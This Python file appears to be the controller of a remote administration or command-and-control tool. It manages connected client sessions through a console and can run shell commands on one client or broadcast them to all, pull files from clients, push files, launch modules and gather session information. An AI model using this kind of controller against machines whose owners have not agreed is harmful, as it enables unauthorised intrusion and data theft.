import asyncio

import aioconsole
from tabulate import tabulate

from server.protocol import *
from server.protocol import Request
from server.session import Session
from utils.common import UnselectedSessionError, WrongAnswerTypeError
from utils.logger import log


class Manager:
	def __init__(self):
		self.sessions: list[Session] = list()
		self.commands: dict[str, ()] = {
			"list": self.list,
			"select": self.select,
			"broadcast": self.broadcast,
			"cli": self.cli,
			"exec": self.exec,
			"upload": self.upload,
			"download": self.download,
			"rm": self.run_module,
			"kill": self.kill,
			"info": self.info,
		}

		self.selected = None

	async def add(self, session: Session) -> None:
		self.sessions.append(session)
		await session.send(json.dumps({
			"type": "session_init",
			"data": {
				"id": session.session_id
			}
		}) + "EOM")
		log(f"Session ({session.session_id}) ajouté au manager", 0)

	def get(self, _id) -> Session:
		for session in self.sessions:
			if session.session_id == int(_id):
				return session

	async def start(self):
		log("Console démarée", 1)
		while True:
			command = await aioconsole.ainput("[SERVER] # ")
			cmd_name, *args = command.strip().split(" ", 1)
			if not cmd_name in self.commands.keys():
				print("Invalid command")
				continue
			else:
				for combo in self.commands.items():
					if combo[0] == cmd_name:
						try:
							if asyncio.iscoroutinefunction(combo[1]):
								await combo[1](" ".join(args))
							else:
								combo[1](" ".join(args))

						except UnselectedSessionError:
							print("Unselected session")

	def list(self, _=None):
		if not self.sessions:
			print("Aucune session active.")
			return

		table = []
		for s in self.sessions:
			table.append([s.session_id, s.ip, s.port])

		print(tabulate(table, headers=["ID", "IP", "Port"], tablefmt="fancy_grid"))
		log("Sessions listées", 0)

		log("Sessions listées", 0)

	async def cli(self, _id: str) -> None:
		nb_id = int(_id)
		for session in self.sessions:
			if session.session_id == nb_id:
				self.selected = session
				log(f"Connexion à la session {session.session_id}", 1)
				while True:
					try:
						command = await aioconsole.ainput(f"[{session.ip}] $ ")
						log(f"Commande exécutée sur {nb_id} {command}", 1)
						if command == "exit":
							return

						answer, answer_type = await self.exec(command)
						session.clear_buffer()

						if answer_type != AnswerType.RESULT:
							raise WrongAnswerTypeError

						else:
							content = answer["data"]["output"]
							log(f"Résultat de la commande sur le client {session.session_id} - {content}", 1)

					except (asyncio.IncompleteReadError, ConnectionResetError):
						log(f"Déconnexion client {session.ip}:{session.port}", 3)
						self.remove(session)

					except WrongAnswerTypeError:
						log(f"Mauvais type de réponse du client {session.session_id}", 3)


		self.selected = None

	async def broadcast(self, command) -> None:
		for session in self.sessions:
			self.selected = session
			await self.exec(command)
			session.clear_buffer()
		log(f"Commande broadcastée : {command}", 2)

	def remove(self, session: Session) -> None:
		self.sessions.remove(session)

	def select(self, session_id: str) -> None:
		session_id = int(session_id)
		for session in self.sessions:
			if session.session_id == session_id:
				print("Selected session", session.session_id)
				self.selected = session

	async def run(self, cmd, *args) -> tuple:
		if self.selected is None:
			raise UnselectedSessionError

		if cmd == "exec":
			request: Request = Exec(*args)
			return await request.send(self.selected)

		elif cmd == "upload":
			request: Request = Upload(*args)
			return await request.send(self.selected)

		elif cmd == "download":
			request: Request = Download(*args)
			return await request.send(self.selected)

		elif cmd == "run_module":
			request: Request = RunModule(*args)
			return await request.send(self.selected)

		elif cmd == "kill":
			request: Request = Kill()
			return await request.send(self.selected)

		elif cmd == "info":
			request: Request = Info()
			return await request.send(self.selected)

	async def exec(self, command) -> tuple:
		output = await self.run("exec", command)
		log(f"Commande {command} envoyée à {self.selected.session_id}", 1)
		return output

	async def upload(self, args: str) -> None:
		try:
			with open(args) as f:
				content = f.read()
			await self.run("upload", args, content)
			log(f"Fichier {args} envoyé à {self.selected.session_id}", 1)

		except FileNotFoundError:
			print("File not found")

	async def download(self, args) -> None:
		await self.run("download", args)
		log(f"Fichier {args} téléchargé de {self.selected.session_id}", 1)

	async def run_module(self, args) -> None:
		await self.run("run_module", args)
		log(f"Module {args} lancé sur {self.selected.session_id}", 1)

	async def kill(self, _=None) -> None:
		await self.run("kill")
		log(f"Session {self.selected.session_id} tuée", 2)
		self.sessions.remove(self.selected)
		self.selected = None

	async def info(self, _=None) -> None:
		await self.run("info")
		log(f"Infos de la session {self.selected.session_id} collectés", 1)


	async def listen_sessions(self, session: Session, event):
		while True:
			await event.wait()
			result = await session.recv()
			answer, type_ = AnswerParser.parse(result)

			if type_ == AnswerType.FILE:
				file_name = answer["data"]["file_name"]
				content = answer["data"]["content"]
				with open(f"downloads/{file_name}", "w") as f:
					f.write(content)

			elif type_ == AnswerType.KILL:
				_id = answer["data"]["id"]
				for session in self.sessions:
					if session.session_id == _id:
						self.sessions.remove(session)
						break











